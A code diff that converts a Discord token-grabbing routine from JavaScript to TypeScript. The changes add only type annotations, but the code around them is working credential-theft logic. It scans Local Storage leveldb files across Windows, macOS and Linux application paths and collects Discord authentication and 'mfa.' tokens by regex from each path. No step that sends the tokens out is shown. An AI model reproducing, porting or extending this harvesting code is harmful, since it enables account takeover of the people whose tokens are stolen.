@@ -1,20 +1,20 @@
 const fs = require('fs');
 const path = require('path');
 
-const findToken = (tokenPath) => {
+const findToken = (tokenPath: string) => {
     const computerPlatform = process.platform;
 
-    let tokens = [];
+    let tokens: string[] = [];
 
     if (computerPlatform == 'win32') {
         tokenPath += '\\Local Storage\\leveldb';
 
         try {
-            fs.readdirSync(path.normalize(tokenPath)).map((file) => {
+            fs.readdirSync(path.normalize(tokenPath)).map((file: string) => {
                 if (file.endsWith('.log') || file.endsWith('.ldb')) {
                     fs.readFileSync(`${tokenPath}\\${file}`, 'utf8')
                         .split(/\r?\n/)
-                        .forEach((line) => {
+                        .forEach((line: string) => {
                             const regex = [
                                 new RegExp(/mfa\.[\w-]{84}/g),
                                 new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
@@ -23,7 +23,7 @@ const findToken = (tokenPath) => {
                                 const token = line.match(_regex);
 
                                 if (token) {
-                                    token.forEach((element) => {
+                                    token.forEach((element: string) => {
                                         if (!tokens.includes(element)) {
                                             tokens.push(element);
                                         }
@@ -40,11 +40,11 @@ const findToken = (tokenPath) => {
         tokenPath += '/Local Storage/leveldb/';
 
         try {
-            fs.readdirSync(path.normalize(tokenPath)).map((file) => {
+            fs.readdirSync(path.normalize(tokenPath)).map((file: string) => {
                 if (file.endsWith('.log') || file.endsWith('.ldb')) {
                     fs.readFileSync(`${tokenPath}/${file}`, 'utf8')
                         .split(/\r?\n/)
-                        .forEach((line) => {
+                        .forEach((line: string) => {
                             const regex = [
                                 new RegExp(/mfa\.[\w-]{84}/g),
                                 new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
@@ -53,7 +53,7 @@ const findToken = (tokenPath) => {
                                 const token = line.match(_regex);
 
                                 if (token) {
-                                    token.forEach((element) => {
+                                    token.forEach((element: string) => {
                                         tokens.push(element);
                                     });
                                 }
@@ -68,11 +68,11 @@ const findToken = (tokenPath) => {
         tokenPath += '/Default/Local Storage/leveldb/';
 
         try {
-            fs.readdirSync(path.normalize(tokenPath)).map((file) => {
+            fs.readdirSync(path.normalize(tokenPath)).map((file: string) => {
                 if (file.endsWith('.log') || file.endsWith('.ldb')) {
                     fs.readFileSync(`${tokenPath}/${file}`, 'utf8')
                         .split(/\r?\n/)
-                        .forEach((line) => {
+                        .forEach((line: string) => {
                             const regex = [
                                 new RegExp(/mfa\.[\w-]{84}/g),
                                 new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
@@ -81,7 +81,7 @@ const findToken = (tokenPath) => {
                                 const token = line.match(_regex);
 
                                 if (token) {
-                                    token.forEach((element) => {
+                                    token.forEach((element: string) => {
                                         if (!tokens.includes(element)) {
                                             tokens.push(element);
                                         }
@@ -198,7 +198,7 @@ const findToken = (tokenPath) => {
         );
     }
 
-    const tokens = {};
+    const tokens: any = {};
     for (let [platform, path] of Object.entries(paths)) {
         const tokenList = findToken(path);
         if (tokenList) {
